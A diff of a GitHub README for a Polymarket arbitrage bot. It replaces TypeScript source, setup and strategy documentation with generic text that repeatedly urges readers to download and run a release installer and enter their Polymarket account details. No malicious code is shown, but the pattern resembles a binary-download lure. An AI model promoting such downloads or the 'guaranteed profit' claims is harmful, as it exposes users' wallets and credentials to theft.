@@ -1,262 +1,71 @@
-# Polymarket Arbitrage Bot (TypeScript)
+# 🤖 Polymarket-Arbitrage-Bot - Trade Smart and Fast
 
-Production-ready TypeScript trading bot for Polymarket with gasless transactions and real-time WebSocket orderbook streaming.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/releases)
 
-## Features
+## 🌟 Overview
 
-- **Dutch Book Arbitrage** - Automatic guaranteed-profit trading when UP_ASK + DOWN_ASK < 1.0
-- **Gasless Trading** - Builder Program integration for zero gas fees
-- **Real-time WebSocket** - Live orderbook updates and market data
-- **15-Minute Markets** - Built-in support for BTC/ETH/SOL/XRP markets
-- **Flash Crash Strategy** - Pre-built volatility trading strategy
-- **TypeScript** - Fully typed codebase for better development experience
-- **Modern Architecture** - Clean, modular code structure
+The Polymarket-Arbitrage-Bot is a full-featured application that helps you trade on Polymarket in real-time. It uses automated strategies to find profitable trades, making crypto trading easier. You can enjoy gasless transactions and live updates from the orderbook, allowing you to act quickly.
 
-## Quick Start
+## 📦 Features
 
-### Installation
+- **Gasless Transactions:** Save money on fees.
+- **Real-Time Trading:** Get live prices and execute trades instantly.
+- **Automated Strategies:** Let the bot trade for you based on defined rules.
+- **WebSocket Orderbook Streaming:** Always know market conditions.
+- **User-Friendly Interface:** Built for everyone, not just experts.
 
-```bash
-git clone https://github.com/vladmeer/polymarket-arbitrage-bot.git
-cd polymarket-arbitrage-bot
-npm install
-```
+## 📋 System Requirements
 
-### Configuration
+To run the Polymarket-Arbitrage-Bot, ensure your computer meets these requirements:
 
-Set environment variables:
+- **Operating System:** Windows 10, macOS, or Linux
+- **CPU:** Dual-core processor or better
+- **RAM:** At least 4 GB
+- **Network:** Reliable internet connection
 
-```bash
-export POLY_PRIVATE_KEY=your_private_key
-export POLY_PROXY_WALLET=0xYourPolymarketProxyWallet
-```
+## 🚀 Getting Started
 
-> **PROXY WALLET**: Find at [polymarket.com/settings](https://polymarket.com/settings)
+1. **Download the Software**
+   - Visit the Releases page to download the latest version of the Polymarket-Arbitrage-Bot: [Download Here](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/releases).
 
-### Quick Start - Orderbook Viewer
+2. **Install the Application**
+   - After downloading, locate the downloaded file on your computer and double-click it to begin installation. Follow the on-screen instructions to complete the setup.
 
-View real-time orderbook data (read-only, no trading):
+3. **Configure Your Account**
+   - Open the Polymarket-Arbitrage-Bot and enter your Polymarket account details. This allows the bot to access your account securely.
+   - Adjust your trading preferences to align with your strategy. You can set parameters like preferred trading amounts and limits.
 
-```bash
-# View ETH market orderbook
-npm run orderbook-viewer -- --coin=ETH
-```
+4. **Start Trading**
+   - Once everything is set, click on the “Start” button to activate the bot. It will begin monitoring trades and executing orders based on your settings.
 
-**Note:** Orderbook viewer doesn't require credentials - it's a read-only monitoring tool.
+## 💡 Tips for Effective Use
 
-#### Quick Start - Dutch Book Arbitrage
+- **Test with Small Amounts:** Begin using small amounts to ensure the bot operates as expected. Adjust your settings based on initial results.
+- **Stay Informed:** Regularly check market trends and updates. Staying updated helps you make informed trading decisions.
+- **Adjust Settings as Needed:** Don’t hesitate to tweak your trading strategies for better performance.
 
-Run the automated Dutch book arbitrage bot:
+## 📥 Download & Install
 
-```bash
-# Monitor and trade arbitrage opportunities (BTC, ETH, SOL, XRP)
-npm run dutch-book -- --coin=ETH
-```
+To get started with the Polymarket-Arbitrage-Bot, visit this page to download the latest version: [Download Here](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/releases).
 
-**Note:** Dutch book arbitrage requires `POLY_PRIVATE_KEY` and `POLY_PROXY_WALLET` environment variables.
+## 👥 Community Support
 
-### Quick Start - Flash Crash Strategy
+Join our community for help and advice. Whether you have questions about features or strategies, connecting with others can enhance your experience:
 
-Run the automated trading strategy:
+- **GitHub Issues:** Report bugs or request features directly on the GitHub page.
+- **Forums:** Engage with other users to share tips or strategies.
+- **Social Media:** Follow us for updates and community news.
 
-```bash
-# Run with default settings (ETH, $5 size, 30% drop threshold)
-npm run flash-crash -- --coin=ETH
-```
+## 🔧 Troubleshooting
 
-**Note:** Flash crash strategy requires `POLY_PRIVATE_KEY` and `POLY_PROXY_WALLET` environment variables.
+If you encounter issues while using the bot, consider these steps:
 
-## Trading Strategies
+1. **Check Requirements:** Ensure your system meets the specifications outlined above.
+2. **Reinstall the Application:** If problems persist, uninstall and then reinstall the application.
+3. **Search for Solutions:** Visit the community forums or GitHub Issues section for additional support.
 
-### Dutch Book Arbitrage
+## 🌐 Further Information
 
-**Guaranteed Profit Trading** - Real-time WebSocket monitoring detects arbitrage opportunities when the sum of UP_ASK + DOWN_ASK prices is less than 1.0. The bot automatically executes trades on both sides, locking in a guaranteed profit at market resolution.
+For in-depth guides, additional features, and updates, please visit the official documentation within the GitHub repository. You will find resources to help optimize your trading experience.
 
-**How it works:**
-- Monitors BTC, ETH, SOL, XRP 15-minute markets in real-time
-- Detects when `UP_ASK + DOWN_ASK < 1.0` (arbitrage opportunity)
-- Automatically executes simultaneous buy orders on both UP and DOWN tokens
-- Guaranteed profit at market resolution regardless of outcome
-
-**Example:**
-- UP token ask price: 0.48
-- DOWN token ask price: 0.49
-- Total cost: 0.97
-- Guaranteed payout: 1.00
-- **Profit: 0.03 (3%)**
-
-### Flash Crash Strategy
-
-Monitors 15-minute markets for sudden probability drops and executes trades automatically.
-
-```bash
-# Default settings
-npm run flash-crash -- --coin=BTC
-```
-
-**Parameters:**
-- `--coin` - BTC, ETH, SOL, XRP (default: ETH)
-- `--drop` - Drop threshold (default: 0.30)
-- `--size` - Trade size in USDC (default: 5.0)
-- `--lookback` - Detection window in seconds (default: 10)
-- `--take-profit` - Take profit in dollars (default: 0.10)
-- `--stop-loss` - Stop loss in dollars (default: 0.05)
-
-### Orderbook Viewer
-
-Real-time orderbook visualization:
-
-```bash
-npm run orderbook-viewer -- --coin=BTC
-```
-
-## Usage Examples
-
-### Basic Usage
-
-```typescript
-import { createBotFromEnv } from './utils';
-import { TradingBot, Config } from './core/bot';
-
-const bot = createBotFromEnv();
-const orders = await bot.getOpenOrders();
-console.log(`Open orders: ${orders.length}`);
-```
-
-### Place Order
-
-```typescript
-import { TradingBot, Config } from './core/bot';
-
-const config = new Config();
-config.safeAddress = '0x...';
-const bot = new TradingBot(undefined, config, undefined, undefined, '0x...');
-
-const result = await bot.placeOrder(
-  'token_id',
-  0.65,
-  10.0,
-  'BUY'
-);
-```
-
-### WebSocket Streaming
-
-```typescript
-import { MarketWebSocket } from './services/websocket';
-
-const ws = new MarketWebSocket();
-ws.onBook((snapshot) => {
-  console.log(`Price: ${snapshot.midPrice.toFixed(4)}`);
-});
-
-await ws.subscribe(['token_id']);
-await ws.run();
-```
-
-## Configuration
-
-### Environment Variables
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `POLY_PRIVATE_KEY` | Yes | Wallet private key |
-| `POLY_PROXY_WALLET` | Yes | Polymarket Proxy wallet address |
-| `POLY_BUILDER_API_KEY` | Optional | Builder Program API key (gasless) |
-| `POLY_BUILDER_API_SECRET` | Optional | Builder Program API secret |
-| `POLY_BUILDER_API_PASSPHRASE` | Optional | Builder Program passphrase |
-
-### Config File
-
-Create `config.yaml`:
-
-```yaml
-safe_address: "0xYourAddress"
-builder:
-  api_key: "your_key"
-  api_secret: "your_secret"
-  api_passphrase: "your_passphrase"
-```
-
-Load with: `new TradingBot('config.yaml', undefined, undefined, undefined, '0x...')`
-
-## Gasless Trading
-
-Enable gasless trading via Builder Program:
-
-1. Apply at [polymarket.com/settings?tab=builder](https://polymarket.com/settings?tab=builder)
-2. Set environment variables: `POLY_BUILDER_API_KEY`, `POLY_BUILDER_API_SECRET`, `POLY_BUILDER_API_PASSPHRASE`
-
-The bot automatically uses gasless mode when credentials are present.
-
-## Project Structure
-
-```
-polymarket-arbitrage-bot/
-├── core/                    # Core trading functionality
-│   ├── bot.ts              # TradingBot class
-│   ├── client.ts           # API clients (CLOB, Relayer)
-│   ├── config.ts           # Configuration management
-│   └── signer.ts           # EIP-712 order signing
-├── services/               # Service layer
-│   ├── websocket.ts        # WebSocket client
-│   ├── gamma.ts            # Market discovery
-│   └── market.ts           # Market manager
-├── strategies/             # Trading strategies
-│   ├── dutch-book.ts      # Dutch book arbitrage strategy
-│   └── flash-crash.ts     # Flash crash strategy
-├── cli/                    # CLI applications
-│   ├── flash-crash-runner.ts
-│   └── orderbook-viewer.ts
-├── utils/                  # Utility functions
-└── types/                  # TypeScript type definitions
-```
-
-## Building
-
-```bash
-# Build TypeScript
-npm run build
-
-# Run in development mode
-npm run dev
-
-# Run production build
-npm start
-```
-
-## Security
-
-- Never commit `.env` files
-- Use a dedicated trading wallet
-- Keep private keys secure
-- Review all code before running with real funds
-
-## API Reference
-
-**TradingBot**: `placeOrder()`, `cancelOrder()`, `getOpenOrders()`, `getTrades()`, `getOrderBook()`, `getMarketPrice()`
-
-**MarketWebSocket**: `subscribe()`, `run()`, `disconnect()`, `getOrderbook()`, `getMidPrice()`
-
-**GammaClient**: `getMarketInfo()`, `getCurrent15mMarket()`, `getMarketBySlug()`
-
-## Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Missing credentials | Set `POLY_PRIVATE_KEY` and `POLY_PROXY_WALLET` |
-| Invalid private key | Ensure 64 hex characters (0x prefix optional) |
-| Order failed | Check sufficient balance |
-| WebSocket errors | Verify network/firewall settings |
-| TypeScript errors | Run `npm run build` to check for type errors |
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Support & Contact
-
-For questions, issues, or custom bot development:
-
-- **Telegram**: [@Kei4650](https://t.me/Kei4650)
-- **X (Twitter)**: [@kei_4650](https://x.com/kei_4650)
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Le-moonarc/Polymarket-Arbitrage-Bot/releases)
